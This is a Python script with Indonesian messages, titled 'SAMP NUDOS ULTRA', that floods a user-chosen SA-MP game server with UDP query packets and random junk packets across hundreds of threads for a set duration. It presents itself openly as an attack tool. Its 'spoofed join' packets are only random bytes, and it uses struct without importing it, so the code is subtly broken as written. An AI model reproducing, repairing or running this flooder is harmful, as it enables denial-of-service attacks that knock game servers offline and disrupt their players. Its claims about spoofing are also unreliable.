import socket
import random
import threading
import time
import os

os.system("clear")
print("\033[31mSAMP NUDOS ULTRA - QUERY + JOIN FLOOD 2026\033[0m\n")

ip = input("Target IP     : ")
port = int(input("Target Port   : ") or 7777)
threads = int(input("Threads       : ") or 300)
duration = int(input("Duration (detik): ") or 60)

SAMP_QUERY = b'SAMP' + bytes([int(x) for x in ip.split('.')]) + struct.pack('<H', port) + b'i'

def build_spoofed_join():
    # Spoofed connection request (mirip incoming connection)
    return random._urandom(random.randint(20, 80))

def query_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    while time.time() < end:
        try:
            # Query flood (paling efektif buat bikin lag)
            sock.sendto(SAMP_QUERY, (ip, port))
            # Tambah random junk query
            junk = b'SAMP' + random._urandom(10)
            sock.sendto(junk, (ip, port))
            print("\033[32m[QUERY] Sent\033[0m", end="\r")
        except:
            pass
        time.sleep(0.0001)

def join_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    while time.time() < end:
        try:
            packet = build_spoofed_join()
            sock.sendto(packet, (ip, port))
            print("\033[33m[JOIN] Spoofed sent\033[0m", end="\r")
        except:
            pass
        time.sleep(0.0001)

print(f"\033[31mMenyerang {ip}:{port} dengan QUERY + JOIN FLOOD...\033[0m")

for _ in range(threads // 2):
    t1 = threading.Thread(target=query_flood, daemon=True)
    t2 = threading.Thread(target=join_flood, daemon=True)
    t1.start()
    t2.start()
    time.sleep(0.01)

try:
    time.sleep(duration)
except KeyboardInterrupt:
    pass

print("\n\033[31mSerangan selesai.\033[0m")
